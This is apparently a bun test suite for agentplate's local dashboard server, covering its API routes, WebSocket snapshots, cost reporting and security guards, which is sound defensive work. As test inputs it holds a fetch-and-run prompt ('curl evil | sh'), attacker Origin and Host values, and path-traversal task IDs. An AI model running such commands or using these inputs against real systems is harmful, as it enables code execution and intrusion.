import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DEFAULT_CONFIG, serializeConfig } from "../config.ts";
import { ValidationError } from "../errors.ts";
import { createEventStore } from "../events/store.ts";
import { currentRunPath, eventsDbPath, sessionsDbPath } from "../paths.ts";
import { createSessionStore } from "../sessions/store.ts";
import type { AgentSession } from "../types.ts";
import { MAX_TEXT_FIELD_CHARS, matchRoute, parseLimit, resolveRoute } from "./api.ts";
import {
	formatHost,
	isLoopbackHost,
	MAX_BODY_BYTES,
	normalizeOrigin,
	resolveAuthToken,
	type ServeHandle,
	startServer,
} from "./server.ts";

let root: string;
let handle: ServeHandle;

function initProject(): void {
	mkdirSync(join(root, ".agentplate"), { recursive: true });
	const config = structuredClone(DEFAULT_CONFIG);
	config.project.name = "serve-test";
	config.project.root = root;
	writeFileSync(join(root, ".agentplate", "config.yaml"), serializeConfig(config), "utf8");
}

beforeEach(() => {
	root = mkdtempSync(join(tmpdir(), "agentplate-serve-"));
	initProject();
	// Port 0 → an ephemeral free port chosen by the OS.
	handle = startServer({ root, port: 0, host: "127.0.0.1", uiDir: join(root, "no-ui") });
});

afterEach(() => {
	handle.stop();
	rmSync(root, { recursive: true, force: true });
});

describe("route matching", () => {
	test("matchRoute captures params", () => {
		expect(matchRoute("/api/agents/:name", "/api/agents/builder-1")).toEqual({ name: "builder-1" });
		expect(matchRoute("/api/agents/:name", "/api/agents")).toBeNull();
		expect(matchRoute("/api/overview", "/api/overview")).toEqual({});
	});

	test("resolveRoute finds known routes", () => {
		expect(resolveRoute("/api/overview")?.route.pattern).toBe("/api/overview");
		expect(resolveRoute("/api/nope")).toBeNull();
	});
});

describe("http server", () => {
	test("GET /healthz returns ok", async () => {
		const res = await fetch(`${handle.url}/healthz`);
		expect(res.status).toBe(200);
		const body = (await res.json()) as { ok: boolean; data: { status: string } };
		expect(body.ok).toBe(true);
		expect(body.data.status).toBe("ok");
	});

	test("GET /api/overview returns the project summary envelope", async () => {
		const res = await fetch(`${handle.url}/api/overview`);
		expect(res.status).toBe(200);
		const body = (await res.json()) as { ok: boolean; data: { project: string } };
		expect(body.ok).toBe(true);
		expect(body.data.project).toBe("serve-test");
	});

	test("GET /api/agents returns an array envelope", async () => {
		const res = await fetch(`${handle.url}/api/agents`);
		const body = (await res.json()) as { ok: boolean; data: unknown[] };
		expect(body.ok).toBe(true);
		expect(Array.isArray(body.data)).toBe(true);
	});

	test("GET /api/deploy/targets includes docker-gha", async () => {
		const res = await fetch(`${handle.url}/api/deploy/targets`);
		const body = (await res.json()) as { ok: boolean; data: Array<{ id: string }> };
		expect(body.data.some((t) => t.id === "docker-gha")).toBe(true);
	});

	test("unknown /api route 404s", async () => {
		const res = await fetch(`${handle.url}/api/does-not-exist`);
		expect(res.status).toBe(404);
	});

	test("static fallback returns 503 when UI is not built", async () => {
		const res = await fetch(`${handle.url}/`);
		expect(res.status).toBe(503);
	});

	test("GET /api/feed returns an array envelope", async () => {
		const res = await fetch(`${handle.url}/api/feed`);
		const body = (await res.json()) as { ok: boolean; data: unknown[] };
		expect(body.ok).toBe(true);
		expect(Array.isArray(body.data)).toBe(true);
	});

	test("GET /api/system returns real host metrics", async () => {
		const res = await fetch(`${handle.url}/api/system`);
		expect(res.status).toBe(200);
		const body = (await res.json()) as {
			ok: boolean;
			data: { cpu: { cores: number; percent: number }; memory: { percent: number } };
		};
		expect(body.ok).toBe(true);
		expect(body.data.cpu.cores).toBeGreaterThan(0);
		expect(body.data.memory.percent).toBeGreaterThanOrEqual(0);
	});

	test("GET /api/costs returns a (possibly empty) report", async () => {
		const res = await fetch(`${handle.url}/api/costs`);
		const body = (await res.json()) as {
			ok: boolean;
			data: { hasData: boolean; daily: unknown[]; byAgent: unknown[] };
		};
		expect(body.ok).toBe(true);
		expect(typeof body.data.hasData).toBe("boolean");
		expect(Array.isArray(body.data.daily)).toBe(true);
		expect(Array.isArray(body.data.byAgent)).toBe(true);
	});

	test("feed items carry a compact label + level (terminal-feed style)", async () => {
		const mod = await import("../mail/client.ts");
		const client = mod.createMailClient(root);
		client.send({
			from: "builder-9",
			to: "lead",
			subject: "done",
			body: "ok",
			type: "worker_done",
		});
		client.close();
		const res = await fetch(`${handle.url}/api/feed`);
		const body = (await res.json()) as {
			data: Array<{ kind: string; label: string; level: string }>;
		};
		const mailItem = body.data.find((f) => f.kind === "mail");
		expect(mailItem).toBeDefined();
		expect(typeof mailItem?.label).toBe("string");
		expect((mailItem?.label.length ?? 0) > 0).toBe(true);
		expect(["info", "warn", "error"]).toContain(mailItem?.level ?? "");
	});

	test("GET /api/handoffs returns only protocol handoff mail", async () => {
		// Seed a handoff (worker_done) + a non-handoff (status) message.
		const mod = await import("../mail/client.ts");
		const client = mod.createMailClient(root);
		client.send({
			from: "builder-1",
			to: "lead",
			subject: "done",
			body: "ok",
			type: "worker_done",
		});
		client.send({ from: "operator", to: "coordinator", subject: "hi", body: "x", type: "status" });
		client.close();

		const res = await fetch(`${handle.url}/api/handoffs`);
		const body = (await res.json()) as { ok: boolean; data: Array<{ type: string }> };
		expect(body.ok).toBe(true);
		expect(body.data.length).toBeGreaterThan(0);
		expect(body.data.every((h) => h.type !== "status")).toBe(true);
		expect(body.data.some((h) => h.type === "worker_done")).toBe(true);
	});

	test("GET /api/tasks derives tasks from specs + sessions with rolled-up status", async () => {
		// Seed a spec file (a pending task with no session yet).
		const specsDir = join(root, ".agentplate", "specs");
		mkdirSync(specsDir, { recursive: true });
		writeFileSync(join(specsDir, "TASK-1.md"), "# Task TASK-1\n\nBuild the login form\n", "utf8");

		const res = await fetch(`${handle.url}/api/tasks`);
		const body = (await res.json()) as {
			ok: boolean;
			data: Array<{ taskId: string; status: string; summary: string | null }>;
		};
		expect(body.ok).toBe(true);
		const t = body.data.find((x) => x.taskId === "TASK-1");
		expect(t).toBeDefined();
		expect(t?.status).toBe("pending"); // spec exists, no session yet
		expect(t?.summary).toBe("Build the login form");
	});

	test("GET /api/agents/:name returns enriched detail (session, events, inbox, sent, children)", async () => {
		const res = await fetch(`${handle.url}/api/agents/coordinator`);
		const body = (await res.json()) as {
			ok: boolean;
			data: { events: unknown[]; inbox: unknown[]; sent: unknown[]; children: unknown[] };
		};
		expect(body.ok).toBe(true);
		expect(Array.isArray(body.data.events)).toBe(true);
		expect(Array.isArray(body.data.inbox)).toBe(true);
		expect(Array.isArray(body.data.sent)).toBe(true);
		expect(Array.isArray(body.data.children)).toBe(true);
	});
});

describe("write endpoints", () => {
	test("POST /api/chat messages the coordinator and shows in the feed", async () => {
		const res = await fetch(`${handle.url}/api/chat`, {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({ message: "build me a todo app" }),
		});
		expect(res.status).toBe(200);
		const body = (await res.json()) as { ok: boolean; data: { sent: { to: string } } };
		expect(body.ok).toBe(true);
		expect(body.data.sent.to).toBe("coordinator");

		// The message appears in the unified feed.
		const feedRes = await fetch(`${handle.url}/api/feed`);
		const feed = (await feedRes.json()) as { data: Array<{ kind: string; summary: string }> };
		expect(feed.data.some((f) => f.kind === "mail" && f.summary.includes("coordinator"))).toBe(
			true,
		);
	});

	test("POST /api/chat rejects an empty message (400)", async () => {
		const res = await fetch(`${handle.url}/api/chat`, {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({ message: "   " }),
		});
		expect(res.status).toBe(400);
	});

	test("POST /api/tasks writes a spec and accepts the task", async () => {
		const res = await fetch(`${handle.url}/api/tasks`, {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({ prompt: "add a health endpoint", capability: "builder" }),
		});
		expect(res.status).toBe(200);
		const body = (await res.json()) as { ok: boolean; data: { accepted: boolean; taskId: string } };
		expect(body.ok).toBe(true);
		expect(body.data.accepted).toBe(true);
		// The spec file was written.
		const { existsSync } = await import("node:fs");
		expect(existsSync(join(root, ".agentplate", "specs", `${body.data.taskId}.md`))).toBe(true);
	});

	test("GET on a write-only path is a 404 (not found in GET table)", async () => {
		const res = await fetch(`${handle.url}/api/chat`);
		expect(res.status).toBe(404);
	});
});

describe("agents run scoping", () => {
	// Seed two runs so we can prove the live view is scoped to the active run.
	function seed(): { current: string; old: string } {
		const store = createSessionStore(sessionsDbPath(root));
		try {
			const oldRun = store.createRun("old");
			const curRun = store.createRun("current");
			const mk = (name: string, runId: string): AgentSession => ({
				id: `session-${name}`,
				agentName: name,
				capability: "builder",
				taskId: "t1",
				runId,
				worktreePath: root,
				branchName: "b",
				state: "idle",
				parentAgent: null,
				depth: 0,
				pid: null,
				runtimeSessionId: null,
				startedAt: new Date().toISOString(),
				lastActivity: new Date().toISOString(),
			});
			store.upsertSession(mk("old-a", oldRun.id));
			store.upsertSession(mk("cur-a", curRun.id));
			store.upsertSession(mk("cur-b", curRun.id));
			// current-run.txt is authoritative — point it at the older run on purpose
			// to prove the active run is read from the file, not "newest in the store".
			writeFileSync(currentRunPath(root), `${oldRun.id}\n`, "utf8");
			return { current: oldRun.id, old: curRun.id };
		} finally {
			store.close();
		}
	}

	async function agentNames(query: string): Promise<string[]> {
		const res = await fetch(`${handle.url}/api/agents${query}`);
		const body = (await res.json()) as { data: Array<{ agentName: string }> };
		return body.data.map((a) => a.agentName).sort();
	}

	test("/api/agents scopes to the active run from current-run.txt", async () => {
		const { current } = seed();
		// Active run (per the file) is the one holding only old-a.
		expect(await agentNames("")).toEqual(["old-a"]);
		expect(await agentNames(`?run=${current}`)).toEqual(["old-a"]);
	});

	test("/api/agents?all=1 returns every run; ?run= targets a specific run", async () => {
		const { old } = seed();
		expect(await agentNames("?all=1")).toEqual(["cur-a", "cur-b", "old-a"]);
		expect(await agentNames(`?run=${old}`)).toEqual(["cur-a", "cur-b"]);
	});
});

describe("costs aggregation", () => {
	test("/api/costs sums per-turn token/cost events by agent and reports hasData", async () => {
		const events = createEventStore(eventsDbPath(root));
		try {
			const usage = (tokens: number, cost: number) => JSON.stringify({ tokens, cost });
			events.record({
				agentName: "builder-1",
				runId: "r1",
				type: "result",
				detail: usage(100, 0.02),
			});
			events.record({
				agentName: "builder-1",
				runId: "r1",
				type: "result",
				detail: usage(50, 0.01),
			});
			events.record({
				agentName: "scout-1",
				runId: "r1",
				type: "result",
				detail: usage(30, 0.005),
			});
			// Non-usage events must be ignored.
			events.record({ agentName: "scout-1", runId: "r1", type: "assistant", detail: null });
		} finally {
			events.close();
		}

		const res = await fetch(`${handle.url}/api/costs`);
		const body = (await res.json()) as {
			data: {
				hasData: boolean;
				totalTokens: number;
				totalCostUsd: number;
				byAgent: Array<{ agent: string; tokens: number; costUsd: number }>;
			};
		};
		expect(body.data.hasData).toBe(true);
		expect(body.data.totalTokens).toBe(180);
		expect(body.data.totalCostUsd).toBeCloseTo(0.035, 4);
		// Highest spender first; builder-1's two turns are merged.
		expect(body.data.byAgent[0]).toEqual({ agent: "builder-1", tokens: 150, costUsd: 0.03 });
	});

	test("/api/costs reports hasData:false when no usage has been recorded", async () => {
		const res = await fetch(`${handle.url}/api/costs`);
		const body = (await res.json()) as { data: { hasData: boolean; totalTokens: number } };
		expect(body.data.hasData).toBe(false);
		expect(body.data.totalTokens).toBe(0);
	});
});

describe("idle reaper (serve loop)", () => {
	test("a long-idle worker is auto-reaped to stopped; the coordinator is spared", async () => {
		// Seed a stale worker (11m idle) and a coordinator (older, but excluded).
		const store = createSessionStore(sessionsDbPath(root));
		const stale = new Date(Date.now() - 11 * 60_000).toISOString();
		const mk = (name: string, capability: AgentSession["capability"]): AgentSession => ({
			id: `session-${name}`,
			agentName: name,
			capability,
			taskId: "t",
			runId: "r1",
			// Outside .agentplate/worktrees so the reaper skips git removal here.
			worktreePath: join(root, "not-managed", name),
			branchName: `agentplate/${name}`,
			state: capability === "coordinator" ? "working" : "idle",
			parentAgent: null,
			depth: capability === "coordinator" ? 0 : 1,
			pid: null,
			runtimeSessionId: null,
			startedAt: stale,
			lastActivity: stale,
		});
		try {
			store.createRun("r1");
			store.upsertSession(mk("builder-old", "builder"));
			store.upsertSession(mk("coordinator", "coordinator"));
		} finally {
			store.close();
		}

		// A second server on the same root with a fast reap sweep (default 10m
		// timeout from config; the 11m-idle worker qualifies immediately).
		const reaper = startServer({
			root,
			port: 0,
			host: "127.0.0.1",
			uiDir: join(root, "no-ui"),
			reapIntervalMs: 40,
		});
		try {
			let workerState = "";
			for (let i = 0; i < 60; i++) {
				await new Promise((r) => setTimeout(r, 30));
				const s = createSessionStore(sessionsDbPath(root));
				workerState = s.getSessionByAgent("builder-old")?.state ?? "";
				const coordState = s.getSessionByAgent("coordinator")?.state ?? "";
				s.close();
				if (workerState === "stopped") {
					expect(coordState).toBe("working"); // coordinator never reaped
					break;
				}
			}
			expect(workerState).toBe("stopped");
		} finally {
			reaper.stop();
		}
	});
});

// ---------------------------------------------------------------------------
// Request guard: CSRF / cross-site WS / DNS rebinding / body + taskId checks.
// ---------------------------------------------------------------------------

const EVIL = "http://evil.example";

function specFiles(): string[] {
	const dir = join(root, ".agentplate", "specs");
	return existsSync(dir) ? readdirSync(dir) : [];
}

async function post(
	path: string,
	body: string,
	headers: Record<string, string> = { "content-type": "application/json" },
): Promise<Response> {
	return fetch(`${handle.url}${path}`, { method: "POST", headers, body });
}

/** Open a WS and resolve with the first frame, or reject if the upgrade is refused. */
function firstWsFrame(origin?: string): Promise<string> {
	const wsUrl = `${handle.url.replace("http", "ws")}/ws`;
	const ws = origin ? new WebSocket(wsUrl, { headers: { origin } }) : new WebSocket(wsUrl);
	return new Promise<string>((resolve, reject) => {
		const timer = setTimeout(() => reject(new Error("no frame")), 3000);
		ws.onmessage = (ev) => {
			clearTimeout(timer);
			ws.close();
			resolve(typeof ev.data === "string" ? ev.data : "");
		};
		ws.onerror = () => {
			clearTimeout(timer);
			reject(new Error("ws refused"));
		};
	});
}

describe("request guard: CSRF on write endpoints", () => {
	test("a cross-origin POST /api/tasks is refused (403) and writes no spec", async () => {
		const res = await post("/api/tasks", JSON.stringify({ prompt: "curl evil | sh" }), {
			"content-type": "application/json",
			origin: EVIL,
		});
		expect(res.status).toBe(403);
		expect(specFiles()).toEqual([]);
	});

	test("a cross-origin no-cors text/plain POST /api/chat is refused (403)", async () => {
		const res = await post("/api/chat", JSON.stringify({ message: "injected" }), {
			"content-type": "text/plain;charset=UTF-8",
			origin: EVIL,
		});
		expect(res.status).toBe(403);
	});

	test("an opaque `null` Origin (sandboxed iframe) is refused", async () => {
		const res = await post("/api/chat", JSON.stringify({ message: "x" }), {
			"content-type": "application/json",
			origin: "null",
		});
		expect(res.status).toBe(403);
	});

	test("a non-JSON content-type (CORS simple request) is refused with 415", async () => {
		const res = await post("/api/tasks", JSON.stringify({ prompt: "hi" }), {
			"content-type": "text/plain",
		});
		expect(res.status).toBe(415);
		expect(specFiles()).toEqual([]);
	});

	test("other non-GET methods are Origin-checked too", async () => {
		const res = await fetch(`${handle.url}/api/tasks`, {
			method: "DELETE",
			headers: { origin: EVIL },
		});
		expect(res.status).toBe(403);
	});

	test("the bundled SPA's same-origin POST (Origin = server URL) still works", async () => {
		const port = handle.server.port;
		for (const origin of [handle.url, `http://localhost:${port}`]) {
			const res = await post("/api/chat", JSON.stringify({ message: `hi from ${origin}` }), {
				"content-type": "application/json",
				origin,
			});
			expect(res.status).toBe(200);
		}
	});

	test("an explicit allowedOrigins entry (Vite dev server) is trusted", async () => {
		const dev = startServer({
			root,
			port: 0,
			host: "127.0.0.1",
			uiDir: join(root, "no-ui"),
			allowedOrigins: ["http://localhost:5173"],
		});
		try {
			const res = await fetch(`${dev.url}/api/chat`, {
				method: "POST",
				headers: { "content-type": "application/json", origin: "http://localhost:5173" },
				body: JSON.stringify({ message: "from vite" }),
			});
			expect(res.status).toBe(200);
		} finally {
			dev.stop();
		}
	});

	test("startServer rejects an untrustable allowedOrigins entry", () => {
		expect(() =>
			startServer({
				root,
				port: 0,
				host: "127.0.0.1",
				uiDir: join(root, "no-ui"),
				allowedOrigins: ["*"],
			}),
		).toThrow(ValidationError);
		expect(() => normalizeOrigin("file:///etc/passwd")).toThrow(ValidationError);
		expect(normalizeOrigin("HTTP://LocalHost:5173/")).toBe("http://localhost:5173");
	});
});

describe("request guard: DNS rebinding (Host allowlist on loopback)", () => {
	test("a foreign Host header is refused on every route", async () => {
		for (const path of ["/healthz", "/api/mail", "/api/overview", "/"]) {
			const res = await fetch(`${handle.url}${path}`, {
				headers: { host: `attacker.example:${handle.server.port}` },
			});
			expect(res.status).toBe(403);
		}
	});

	test("the loopback aliases on the bound port are accepted", async () => {
		const port = handle.server.port;
		for (const host of [`127.0.0.1:${port}`, `localhost:${port}`, `[::1]:${port}`]) {
			const res = await fetch(`${handle.url}/healthz`, { headers: { host } });
			expect(res.status).toBe(200);
		}
	});

	test("the right name on the wrong port is still refused", async () => {
		const res = await fetch(`${handle.url}/api/overview`, {
			headers: { host: `127.0.0.1:${(handle.server.port ?? 0) + 1}` },
		});
		expect(res.status).toBe(403);
	});
});

describe("request guard: cross-site WebSocket hijacking", () => {
	test("a /ws upgrade from a foreign Origin is refused (no snapshot leaks)", async () => {
		await expect(firstWsFrame(EVIL)).rejects.toThrow("ws refused");
	});

	test("a /ws upgrade from the server's own origin (the SPA) gets a snapshot", async () => {
		const frame = await firstWsFrame(handle.url);
		expect((JSON.parse(frame) as { type: string }).type).toBe("snapshot");
	});
});

describe("request guard: POST body shape + size", () => {
	test("a JSON `null` / array / scalar body is a 400, not a 500", async () => {
		for (const body of ["null", "[]", '"x"', "42"]) {
			const res = await post("/api/chat", body);
			expect(res.status).toBe(400);
		}
	});

	test("malformed JSON is a 400", async () => {
		const res = await post("/api/chat", "{not json");
		expect(res.status).toBe(400);
	});

	test("a body over MAX_BODY_BYTES is refused with 413 and writes nothing", async () => {
		const prompt = "x".repeat(MAX_BODY_BYTES + 10);
		const res = await post("/api/tasks", JSON.stringify({ prompt }));
		expect(res.status).toBe(413);
		expect(specFiles()).toEqual([]);
	});

	test("a prompt / message over MAX_TEXT_FIELD_CHARS is a 400", async () => {
		const big = "y".repeat(MAX_TEXT_FIELD_CHARS + 1);
		expect((await post("/api/tasks", JSON.stringify({ prompt: big }))).status).toBe(400);
		expect((await post("/api/chat", JSON.stringify({ message: big }))).status).toBe(400);
		expect(specFiles()).toEqual([]);
	});
});

describe("POST /api/tasks input validation", () => {
	test("a path-traversal taskId is rejected (400) and no file escapes specs/", async () => {
		for (const taskId of [
			"../../CLAUDE",
			"../agent-defs/builder",
			"../../../escaped",
			"a/b",
			"..",
			"a..b",
			"-rf",
			".hidden",
			"x".repeat(65),
		]) {
			const res = await post("/api/tasks", JSON.stringify({ prompt: "pwn", taskId }));
			expect(res.status).toBe(400);
		}
		expect(existsSync(join(root, "CLAUDE.md"))).toBe(false);
		expect(existsSync(join(root, ".agentplate", "agent-defs", "builder.md"))).toBe(false);
		expect(specFiles()).toEqual([]);
	});

	test("a well-formed taskId is accepted and its spec lands inside specs/", async () => {
		const res = await post("/api/tasks", JSON.stringify({ prompt: "ok", taskId: "TASK-1.v2_a" }));
		expect(res.status).toBe(200);
		expect(specFiles()).toEqual(["TASK-1.v2_a.md"]);
	});

	test("an unknown capability is a 400 (not a silent accepted:true)", async () => {
		const res = await post("/api/tasks", JSON.stringify({ prompt: "x", capability: "Builder" }));
		expect(res.status).toBe(400);
		const body = (await res.json()) as { ok: boolean; error: { message: string } };
		expect(body.ok).toBe(false);
		expect(body.error.message).toContain("Unknown capability");
		expect(specFiles()).toEqual([]);
	});
});

describe("list ?limit= parsing", () => {
	test("parseLimit falls back on junk and clamps to [1, 1000]", () => {
		expect(parseLimit(null, 100)).toBe(100);
		expect(parseLimit("x", 100)).toBe(100);
		expect(parseLimit("0", 60)).toBe(60);
		expect(parseLimit("-5", 60)).toBe(60);
		expect(parseLimit("7.9", 60)).toBe(7);
		expect(parseLimit("999999", 60)).toBe(1000);
	});

	test("/api/events?limit=x no longer returns every event", async () => {
		const events = createEventStore(eventsDbPath(root));
		try {
			for (let i = 0; i < 120; i++) events.record({ agentName: "a", runId: "r", type: "tick" });
		} finally {
			events.close();
		}
		const res = await fetch(`${handle.url}/api/events?limit=x`);
		const body = (await res.json()) as { data: unknown[] };
		expect(body.data.length).toBe(100);
	});
});

describe("bind-host helpers", () => {
	test("isLoopbackHost recognizes loopback binds only", () => {
		for (const h of ["127.0.0.1", "127.1.2.3", "localhost", "LOCALHOST", "::1", "[::1]"]) {
			expect(isLoopbackHost(h)).toBe(true);
		}
		for (const h of ["0.0.0.0", "::", "192.168.1.5", "example.com", "127.0.0.1.evil.com"]) {
			expect(isLoopbackHost(h)).toBe(false);
		}
	});

	test("formatHost brackets IPv6 literals for URLs", () => {
		expect(formatHost("::1")).toBe("[::1]");
		expect(formatHost("[::1]")).toBe("[::1]");
		expect(formatHost("127.0.0.1")).toBe("127.0.0.1");
	});
});

describe("websocket", () => {
	test("a connecting client receives a snapshot frame", async () => {
		const wsUrl = handle.url.replace("http", "ws");
		const ws = new WebSocket(`${wsUrl}/ws`);
		const frame = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("no frame")), 3000);
			ws.onmessage = (ev) => {
				clearTimeout(timer);
				resolve(typeof ev.data === "string" ? ev.data : "");
			};
			ws.onerror = () => {
				clearTimeout(timer);
				reject(new Error("ws error"));
			};
		});
		ws.close();
		const parsed = JSON.parse(frame) as { type: string; overview: { project: string } };
		expect(parsed.type).toBe("snapshot");
		expect(parsed.overview.project).toBe("serve-test");
	});
});

describe("bearer token on non-loopback binds", () => {
	let remote: ServeHandle;
	let base: string;

	beforeEach(() => {
		// A wildcard bind is non-loopback, so a per-launch token is generated.
		remote = startServer({ root, port: 0, host: "0.0.0.0", uiDir: join(root, "no-ui") });
		base = `http://127.0.0.1:${remote.server.port}`;
	});

	afterEach(() => {
		remote.stop();
	});

	function wsFrame(url: string): Promise<string> {
		const ws = new WebSocket(url);
		return new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("no frame")), 3000);
			ws.onmessage = (ev) => {
				clearTimeout(timer);
				ws.close();
				resolve(typeof ev.data === "string" ? ev.data : "");
			};
			ws.onerror = () => {
				clearTimeout(timer);
				reject(new Error("ws refused"));
			};
		});
	}

	test("a random per-launch token is generated (and differs per launch)", () => {
		expect(remote.token).toMatch(/^[0-9a-f-]{36}$/);
		const other = startServer({ root, port: 0, host: "0.0.0.0", uiDir: join(root, "no-ui") });
		try {
			expect(other.token).not.toBe(remote.token);
		} finally {
			other.stop();
		}
	});

	test("/api/* without a token is 401 (GET and POST); nothing is written", async () => {
		const get = await fetch(`${base}/api/overview`);
		expect(get.status).toBe(401);
		expect(get.headers.get("www-authenticate")).toContain("Bearer");
		const postRes = await fetch(`${base}/api/tasks`, {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({ prompt: "do a thing" }),
		});
		expect(postRes.status).toBe(401);
		expect(specFiles()).toEqual([]);
		// The async GETs are gated too.
		expect((await fetch(`${base}/api/system`)).status).toBe(401);
	});

	test("a wrong token is 401", async () => {
		const res = await fetch(`${base}/api/overview`, {
			headers: { authorization: "Bearer not-the-token" },
		});
		expect(res.status).toBe(401);
		expect((await fetch(`${base}/api/overview?token=nope`)).status).toBe(401);
	});

	test("Authorization: Bearer or ?token= unlocks /api/*", async () => {
		const token = remote.token ?? "";
		const viaHeader = await fetch(`${base}/api/overview`, {
			headers: { authorization: `Bearer ${token}` },
		});
		expect(viaHeader.status).toBe(200);
		const viaQuery = await fetch(`${base}/api/overview?token=${encodeURIComponent(token)}`);
		expect(viaQuery.status).toBe(200);
	});

	test("/ws requires the token (query param, since browsers can't set WS headers)", async () => {
		const ws = `ws://127.0.0.1:${remote.server.port}/ws`;
		await expect(wsFrame(ws)).rejects.toThrow("ws refused");
		const frame = await wsFrame(`${ws}?token=${encodeURIComponent(remote.token ?? "")}`);
		expect((JSON.parse(frame) as { type: string }).type).toBe("snapshot");
	});

	test("/healthz and the static SPA stay reachable without a token", async () => {
		expect((await fetch(`${base}/healthz`)).status).toBe(200);
		// UI not built here → 503, but crucially not 401: the page load itself is ungated.
		expect((await fetch(`${base}/?token=x`)).status).toBe(503);
	});
});

describe("bearer token: loopback stays token-free", () => {
	test("a loopback bind has no token and serves /api + /ws without one", async () => {
		expect(handle.token).toBeNull();
		expect((await fetch(`${handle.url}/api/overview`)).status).toBe(200);
		const frame = await firstWsFrame();
		expect((JSON.parse(frame) as { type: string }).type).toBe("snapshot");
	});

	test("resolveAuthToken: loopback → null, remote → uuid, explicit wins, empty refused", () => {
		expect(resolveAuthToken("127.0.0.1", undefined)).toBeNull();
		expect(resolveAuthToken("localhost", undefined)).toBeNull();
		expect(resolveAuthToken("0.0.0.0", undefined)).toMatch(/^[0-9a-f-]{36}$/);
		expect(resolveAuthToken("0.0.0.0", null)).toBeNull();
		expect(resolveAuthToken("127.0.0.1", "fixed")).toBe("fixed");
		expect(() => resolveAuthToken("0.0.0.0", " ")).toThrow(ValidationError);
	});
});
